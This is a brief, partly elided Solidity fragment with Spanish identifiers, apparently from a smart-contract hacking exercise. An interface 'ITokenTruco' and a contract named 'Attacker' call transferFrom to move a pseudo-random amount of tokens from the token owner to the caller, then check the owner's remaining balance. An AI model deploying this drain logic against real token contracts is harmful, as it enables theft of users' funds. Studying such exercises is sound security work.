...
interface ITokenTruco {
    ...
    // Esta función debería devolver un número entero aleatorio
...
contract Attacker {
    ...
    function ejecutarAtaque() public {
        ...
        uint256 montoAleatorio = tokenTruco.montoAleatorio();
       
        
        tokenTruco.transferFrom(tokenTruco.owner(), msg.sender, montoAleatorio);
                            
        
        uint256 restante= tokenTruco.balances(tokenTruco.owner());
